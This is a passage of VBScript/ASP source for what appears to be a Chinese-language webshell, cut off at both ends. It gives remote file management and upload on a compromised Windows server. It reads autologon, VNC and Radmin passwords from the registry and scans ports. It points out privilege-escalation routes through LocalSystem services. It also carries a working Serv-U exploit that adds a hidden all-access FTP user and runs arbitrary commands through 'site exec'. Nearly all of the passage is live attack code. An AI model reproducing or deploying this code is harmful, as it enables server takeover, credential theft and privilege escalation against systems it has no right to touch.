RRS SI:SI=""
End If
Conn.Close
Set Conn=Nothing
End If
End Function
Dim T1
Class UPC
Dim D1,D2
Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
End Function
Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
End Function
Private Sub Class_Initialize
Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
set D1=CreateObject(ObT(4,0))
if Request.TotalBytes<1 then Exit Sub
set T1 = CreateObject(ObT(6,0))
T1.Type = 1 : T1.Mode =3 : T1.Open
T1.Write  Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : DStart = 1
DEnd = LenB(TDa)
set D2=CreateObject(ObT(4,0))
vbCrlf = chrB(13) & chrB(10)
set T2 = CreateObject(ObT(6,0))
TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
TLen = LenB (TSt)
DStart=DStart+TLen+1
while (DStart + 10) < DEnd
DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
T2.Type = 1 : T2.Mode =3 : T2.Open
T1.Position = DStart
T1.CopyTo T2,DIEnd-DStart
T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
TIn = T2.ReadText : T2.Close
DStart = InStrB(DIEnd,TDa,TSt)
FStart = InStr(22,TIn,"name=""",1)+6
FEnd = InStr(FStart,TIn,"""",1)
UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FIF
FStart = InStr(FEnd,TIn,"filename=""",1)+10
FEnd = InStr(FStart,TIn,"""",1)
FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
FEnd = InStr(FStart,TIn,vbCr)
TFL.FileStart =DIEnd
TFL.FileSize = DStart -DIEnd -3
if not D2.Exists(UpName) then
D2.add UpName,TFL
end if
else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
T2.Position = 0 : T2.Type = 2
T2.Charset ="gb2312"
SFV = T2.ReadText
T2.Close
if D1.Exists(UpName) then
D1(UpName)=D1(UpName)&", "&SFV
else
D1.Add UpName,SFV
end if
end if
DStart=DStart+TLen+1
wend
TDa=""
set T2 =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
D1.RemoveAll:D2.RemoveAll
set D1=nothing:set D2=nothing
T1.Close:set T1 =nothing
end if
End Sub
End Class
Class FIF
dim FileSize,FileStart
Private Sub Class_Initialize
FileSize = 0
FileStart= 0
End Sub
Public function SaveAs(F)
dim T3
SaveAs=true
if trim(F)="" or FileStart=0 then exit function
set T3=CreateObject(ObT(6,0))
T3.Mode=3 : T3.Type=1 : T3.Open
T1.position=FileStart
T1.copyto T3,FileSize
T3.SaveToFile F,2
T3.Close
set T3=nothing
SaveAs=false
end function
End Class
Class LBF
Dim CF
Private Sub Class_Initialize
SET CF=CreateObject(ObT(0,0))
End Sub
Private Sub Class_Terminate
Set CF=Nothing
End Sub
Function ShowDriver()
For Each D in CF.Drives
RRS"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>本地磁盘 ("&D.DriveLetter&":)</a><br>" 
Next
End Function
Function Show1File(Path)
Set FOLD=CF.GetFolder(Path)
i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'><tr>"
For Each F in FOLD.subfolders
SI=SI&"<td height=10>"
SI=SI&"<a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""打开""><font face='wingdings' size='6'>0</font>"&F.Name&"</a>" 
SI=SI&" _<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='复制'>Copy</a>"
SI=SI&"  <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='删除'>Del</a>"
SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='移动'>Move</a>"
SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")'  onclick='return yesok()' class='am' title='下载'>Down</a></td>"
i=i+1
If i mod 3 = 0 then SI=SI&"</tr><tr>"
Next
SI=SI&"</tr><tr><td height=2></td></tr></table>"
RRS SI &"<hr noshade size=1 color=""#"" />" : SI=""
For Each L in Fold.files
SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
SI=SI&"<tr style='boungroup-color:#'>"
SI=SI&"<td height='30'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='打开'><font face='wingdings' size='4'>2</font>"&L.Name&"</a></td>"
SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='编辑'>edit</a></td>"
SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>del</a></td>"
SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='复制'>copy</a></td>"
SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='移动'>move</a></td>"
SI=SI&"<td width='50' align=""center"">"&clng(L.size/1024)&"K</td>"
SI=SI&"<td width='200' align=""center"">"&L.Type&"</td>"
SI=SI&"<td width='160'>"&L.DateLastModified&"</td>"
SI=SI&"</tr></table>"
RRS SI:SI=""
Next
Set FOLD=Nothing
End function
Function DelFile(Path)
If CF.FileExists(Path) Then
CF.DeleteFile Path
SI="<center><br><br><br>文件 "&Path&" 删除成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function EditFile(Path)
If Request("Action2")="Post" Then
Set T=CF.CreateTextFile(Path)
T.WriteLine Request.form("content")
T.close
Set T=nothing
SI="<center><br><br><br>文件保存成功！</center>"
SI=SI&BackUrl
RRS SI
Response.End
End If
If Path<>"" Then
Set T=CF.opentextfile(Path, 1, False)
Txt=HTMLEncode(T.readall) 
T.close
Set T=Nothing
Else
Path=Session("FolderPath")&"\1.asp":Txt=""
End If
SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
SI=SI&"<input name='Action' value='EditFile' Type='hidden'>"
SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>"
SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
SI=SI&"<hr><input name='goback' type='button' value='返回' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='重置'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='保存'></form>"
RRS SI
End Function
Function CopyFile(Path)
Path = Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.CopyFile Path(0),Path(1)
SI="<center><br><br><br>文件"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
RRS SI 
End If
End Function
Function MoveFile(Path)
Path = Split(Path,"||||")
If CF.FileExists(Path(0)) and Path(1)<>"" Then
CF.MoveFile Path(0),Path(1)
SI="<center><br><br><br>文件"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
RRS SI 
End If
End Function
Function DelFolder(Path)
If CF.FolderExists(Path) Then
CF.DeleteFolder Path
SI="<center><br><br><br>目录"&Path&"删除成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function CopyFolder(Path)
Path = Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.CopyFolder Path(0),Path(1)
SI="<center><br><br><br>目录"&Path(0)&"复制成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function MoveFolder(Path)
Path = Split(Path,"||||")
If CF.FolderExists(Path(0)) and Path(1)<>"" Then
CF.MoveFolder Path(0),Path(1)
SI="<center><br><br><br>目录"&Path(0)&"移动成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
Function NewFolder(Path)
If Not CF.FolderExists(Path) and Path<>"" Then
CF.CreateFolder Path
SI="<center><br><br><br>目录"&Path&"新建成功！</center>"
SI=SI&BackUrl
RRS SI
End If
End Function
End Class
sub getTerminalInfo()
on error resume next
dim wsh
set wsh=createobject("Wscript.Shell")
Response.Write "[网络探测]<br><hr size=1>"
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
isEnable=Wsh.Regread(EnableTcpipKey)
If isEnable=0 or isEnable="" Then
Notcpipfilter=1
End If
ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
Apds=Wsh.RegRead(ApdKey)
If IsArray(Apds) Then 
For i=LBound(Apds) To UBound(Apds)-1
ApdB=Replace(Apds(i),"\Device\","")
Response.Write "网卡"&i&"的序列为:"&ApdB&"<br>"
Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
IPKey=Path&ApdB&"\IPAddress"
IPaddr=Wsh.Regread(IPKey)
If IPaddr(0)<>"" Then
For j=Lbound(IPAddr) to Ubound(IPAddr)
Response.Write "<li>IP地址"&j&"为:"&IPAddr(j)&"<br>"
Next
Else
Response.Write "<li>IP地址无法读取或没有设置<br>"
End if
GateWayKey=Path&ApdB&"\DefaultGateway"
GateWay=Wsh.Regread(GateWayKey)
If isarray(GateWay) Then
For j=Lbound(Gateway) to Ubound(Gateway)
Response.Write "<li>网关"&j&"为:"&Gateway(j)&"<br>"
Next
Else
Response.Write "<li>默认网关无法读取或没有设置<br>"
End if
DNSKey=Path&ApdB&"\NameServer"
DNSstr=Wsh.RegRead(DNSKey)
If DNSstr<>"" Then
Response.Write "<li>网卡DNS为:"&DNSstr&"<br>"
Else
Response.Write "<li>默认DNS无法读取或没有设置<br>"
End If
if Notcpipfilter=1 Then 
Response.Write "<li>没有Tcp/IP筛选<br>"
else
ETK="\TCPAllowedPorts"
EUK="\UDPAllowedPorts"
FullTCP=Path&ApdB&ETK
FullUDP=path&ApdB&EUK
tcpallow=Wsh.RegRead(FullTCP)
If tcpallow(0)="" or tcpallow(0)=0 Then
Response.Write "<li>允许的TCP端口为:全部<br>"
Else
Response.Write "<li>允许的TCP端口为:"
For j = LBound(tcpallow) To UBound(tcpallow)
Response.Write tcpallow(j)&","
Next
Response.Write "<Br>"
End if
udpallow=Wsh.RegRead(FullUDP)
If udpallow(0)="" or udpallow(0)=0 Then
Response.Write "<li>允许的UDP端口为:全部<br>"
Else
Response.Write "<li>允许的UDP端口为:"
for j = LBound(udpallow) To UBound(udpallow)
Response.Write UDPallow(j)&","
next
Response.Write "<br>"
End if
End if
Response.Write "------------------------------------------------<br>"
Next
end if
Response.Write "<br><br>[特殊端口探测]<br><hr size=1>"
Telnetkey="HKEY_LOCAL_MACHINE\SOFTWARE\ Microsoft\TelnetServer\1.0\TelnetPort"
TlntPort=Wsh.RegRead(TelnetKey)
if TlntPort="" Then Tlnt="23(默认设置)"
Response.Write "<li>Telnet端口:"&Tlntport&"<br>"
TermKey="HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
TermPort=Wsh.RegRead(TermKey)
If TermPort="" Then TermPort="无法读取.请确认是否为Windows Server版本主机"
Response.Write "<li>Terminal Service端口为:"&TermPort&"<br>"
pcAnywhereKey="HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"
PAWPort=Wsh.RegRead(pcAnywhereKey)
If PAWPort="" then PAWPort="无法获取.请确认主机是否安装pcAnywhere"
Response.Write "<li>PcAnywhere端口为:"&PAWPort&"<br>"
Response.Write "------------------------------------------------------"
Set wsX = Server.CreateObject("WScript.Shell")
Dim terminalPortPath, terminalPortKey, termPort
Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
terminalPortKey = "PortNumber"
termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
RrS"终端服务端口及自动登录<ol>"
If termPort = "" Or Err.Number <> 0 Then 
RRS"无法得到终端服务端口, 请检查权限是否已经受到限制.<br/>"
 Else
RrS"当前终端服务端口: " & termPort & "<br/>"
End If
autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
autoLoginEnableKey = "AutoAdminLogon"
autoLoginUserKey = "DefaultUserName"
autoLoginPassKey = "DefaultPassword"
isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
If isAutoLoginEnable = 0 Then
RrS"系统自动登录功能未开启<br/>"
Else
autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
RrS"自动登录的系统帐户: " & autoLoginUsername & "<br>"
autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
If Err Then
Err.Clear
RrS"False"
End If
RrS"自动登录的帐户密码: " & autoLoginPassword & "<br>"
End If
RrS"</ol>"
Response.Write "<br><br><br>[系统软件探测]<br><hr size=1>"
SoftPath=Wsh.Environment.item("Path")
Pathinfo=lcase(SoftPath)
Response.Write "系统软件支持:"
if Instr(Pathinfo,"perl") Then Response.Write "<li>Perl脚本:支持<br>"
if instr(Pathinfo,"java") Then Response.Write "<li>Java脚本:支持<br>"
if instr(Pathinfo,"microsoft sql server") Then Response.Write "<li>MSSQL数据库服务:支持<br>"
if instr(Pathinfo,"mysql") Then Response.Write "<li>MySQL数据库服务:支持<br>"
if instr(Pathinfo,"oracle") Then Response.Write "<li>Oracle数据库服务:支持<br>"
if instr(Pathinfo,"cfusionmx7") Then Response.Write "<li>CFM服务器:支持<br>"
if instr(Pathinfo,"pcanywhere") Then Response.Write "<li>赛门铁克PcAnywhere控制:支持<br>"
if instr(Pathinfo,"Kill") Then Response.Write "<li>Kill杀毒软件:支持<br>"
if instr(Pathinfo,"kav") Then Response.Write "<li> 金山系列杀毒软件:支持<br>"
if instr(Pathinfo,"antivirus") Then Response.Write "<li>赛门铁克杀毒软件:支持<br>"
if instr(Pathinfo,"rising") Then Response.Write "<li>瑞星系列杀毒软件:支持<br>"
paths=split(SoftPath,";")
Response.Write "------------------------------------<br>"
Response.Write "系统当前路径变量:<br>"
For i=Lbound(paths) to Ubound(paths)
Response.Write "<li>"&paths(i)&"<br>"
next
Response.Write "<br><br>[系统设置探测]<br><hr size=1>"
pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
pcname=wsh.RegRead(pcnamekey)
if pcname="" Then pcname="无法读取主机名.<br>"
Response.Write "<li>当前主机名为:"&pcname&"<br>"
AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
AdminName=wsh.RegRead(AdminNameKey)
if adminname="" Then AdminName="Administrator"
Response.Write "<li>默认管理员用户名为:"&AdminName&"<br>"
isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
Autologin=Wsh.RegRead(isAutologin)
if Autologin=0 or Autologin="" Then
Response.Write "<li>用户自动登入:未启用<br>"
Else
Response.Write "<li>用户自动登入:启用<br>"
Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
Response.Write "<li type=square>用户名:"&Admin&"<br>"
Response.Write "<li type=square>密码:"&Passwd&"<br>"
End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="是" else disply="否"
Response.Write "<li>是否显示上次登入用户:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
Response.Write "<li>Telnet Ntml设置为:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
Response.Write"<li>当前活动网卡为:"&kk&"<br>"
Response.Write "------------------------------------<br><br><br>"
Response.write "[服务器弱点探测]<br><hr>"
Set objComputer = GetObject("WinNT://.")
Set sa = Server.CreateObject("Shell.Application")
objComputer.Filter = Array("Service")
On Error Resume Next
For Each objService In objComputer
if objService.Name="Serv-U" Then
if objService.ServiceAccountName="LocalSystem" Then
Response.Write "<li>服务器中有Serv-U安装,且以LocalSystem权限启动,可以考虑用su.exe工具提权<br>"
End if
End if
if lcase(objService.Name)="apache" Then
if objService.ServiceAccountName="LocalSystem" Then
If instr(Request.ServerVariables("SERVER_SOFTWARE"),"Apache") Then
Response.Write "<li>当前WEB服务器为Apache.可以直接提权<br>"
Else
Response.Write " <li>服务器中有Apache服务存在,启动权限为LocalSystem,可以考虑PHP木马<br>"
End if
end if
End if
if instr(lcase(objService.Name),"tomcat") Then
if objService.ServiceAccountName="LocalSystem" Then
Response.Write "<li>服务器中有Tomcat,且以LocalSystem权限启动,可以考虑使用Jsp木马提权<br>"
End if
End if
if instr(lcase(objService.Name),"winmail") Then
if objService.ServiceAccountName="LocalSystem" Then
Response.Write "<li>服务器中有Magic Winmail,且以LocalSystem权限启动,可以查找WebMail目录,并且写入PHP木马<br>"
End if
End if
Next
Set fso=Server.Createobject("Scripting.FileSystemObject")
Sysdrive=left(Fso.GetspecialFolder(2),2)
servername=wsh.RegRead("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName")
If fso.FileExists(sysdriver&"\Documents And Settings\All Users\Application Data\Symantec\"&servername&".cif") Then
Response.Write "<li>发现pcAnywhere密码文件,可以从默认目录下载并破解得到pcAnywhere密码"
End if
End Sub
sub ReadREG()
RrS"注册表键值读取:<hr/>"
RrS"<form method=post>"
RrS"<input type=hidden value=readReg name=theAct>"
RrS"<input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
RrS" <input type=submit value='读取'><br><br>"
RrS"<input type=hidden value=vnc name=vnc>"
RrS"<input name=vnc value='HKCU\Software\ORL\WinVNC3\Password' size=80 type=hidden>"
RrS" <input type=submit value='读取VNC密码'>&nbsp;&nbsp;"
RrS"<input type=hidden value=readReg name=radmin>"
RrS"<input name=radmin value='HKEY_LOCAL_MACHINE\SYSTEM\RAdmin' size=80 type=hidden>"
RrS" <input type=submit value='读取Radmin密码 '>&nbsp;&nbsp;<br><br><br>"
RrS"HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {不显示上次登录用户}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=缺省,1=匿名用户无法列举本机用户列表,2=匿名用户无法连接本机IPC$共享}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {禁止默认共享}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {关闭网络共享}<br/><br>"
RrS"HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {启用TCP/IP筛选(所有试配器)}<br/><br>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {允许IP路由}<br/><br>"
RrS"-------以下似乎要看绑定的网卡,不知道是否准确---------<br/><p></p>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {默认网关}<br/><br>"
RrS"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {首DNS}<br/><br>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {允许的TCP/IP端口}<br/><br>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {允许的UDP端口}<br/><br>"
RrS"-----------OVER--------------------<br/><p></p>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {共几块活动网卡}<br/><br><p></p>"
RrS"HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {当前网卡的序列(把上面的替换)}<br/><br>"
RrS"<span id=regeditInfo style='display:none;'><hr/>"
RrS"</span>"
RrS"</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject("WScript.Shell")
thePath=Request("thePath")
theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray)
RrS"<li>" & theArray(i)
Next
 Else
RrS"<li>" & theArray
End If
end if
end sub
sub ScanPort()
Server.ScriptTimeout = 7776000
if request.Form("port")="" then
PortList="21,23,25,80,110,135,139,445,1433,3389,4899,5631,5632,43958"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
RRS"<p>端口扫描器(如果扫描多个端口,速度比较慢,个人推荐使用CMD)</p>"
RRS"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
RRS"<p>Scan IP:&nbsp;"
RRS" <input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'>"
RRS"<br>Port List:"
RRS"<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'>"
RRS"<br><br>"
RRS"<input name='submit' type='submit' class='buttom' value=' scan '>"
RRS"<input name='scan' type='hidden' id='scan' value='111'>"
RRS"</p></form><p></p>"
response.write("<font size=6 color=red>21--FTP、23--telnet、25--SMTP、80--web、110--POP3、1433--MSSQL、3389--终端<p></p>4899--Radmin、5631--Pcanywhere(TCP)、5632--Pcanywhere(UDP)、43958--serv-u</font><br><br>")
If request.Form("scan") <> "" Then
timer1 = timer
RRS("<b>扫描报告:</b><br><hr>")
tmp = Split(request.Form("port"),",")
ip = Split(request.Form("ip"),",")
For hu = 0 to Ubound(ip)
If InStr(ip(hu),"-") = 0 Then
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ip(hu), tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ip(hu), j)
Next
Else
RRS(startN & " or " & endN & " is not number<br>")
End If
Else
RRS(tmp(i) & " is not number<br>")
End If
End If
Next
Else
ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ipStart & xxx, tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ipStart & xxx,j)
Next
Else
RRS(startN & " or " & endN & " is not number<br>")
End If
Else
RRS(tmp(i) & " is not number<br>")
End If
End If
Next
Next
End If
Next
timer2 = timer
thetime=cstr(int(timer2-timer1))
RRS"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
On Error Resume Next
set conn = Server.CreateObject("ADODB.connection")
connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
conn.ConnectionTimeout = 1
conn.open connstr
If Err Then
If Err.number = -2147217843 or Err.number = -2147467259 Then
If InStr(Err.description, "(Connect()).") > 0 Then
RRS(targetip & ":" & portNum & ".........关闭<br>")
Else
RRS(targetip & ":" & portNum & ".........<font color=red>开放</font><br>")
End If
End If
End If
End Sub
Select Case Action
Case "MainMenu":MainMenu()
Case "getTerminalInfo":getTerminalInfo()
Case "PageAddToMdb":PageAddToMdb()
case "ScanPort":ScanPort()
Case "Servu"
SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');"
RRS"setTimeout('document.all.goldsun.submit();',4000);"
RRS"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
RRS"<form method='post' name='goldsun'>"
RRS"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
RRS"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
RRS"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
RRS"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
RRS"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
RRS"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
RRS"<script language='javascript'>"
RRS"document.write('<center>正在提升权限,请等待...,<center>');"
RRS"setTimeout(""document.all.goldsun.submit();"",4000);"
RRS"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
a.send loginuser & loginpass & mt & deldomain & quit
set session("a")=a
RRS"<center>提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
RRS"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
RRS"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
RRS"<center><form method='post' name='goldsun'>"
RRS"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
RRS"<tr align='center' valign='middle'>"
RRS"<td colspan='2'>Serv-U 提升权限 by golds7n</td>"
RRS"</tr>"
RRS"<tr align='center' valign='middle'>"
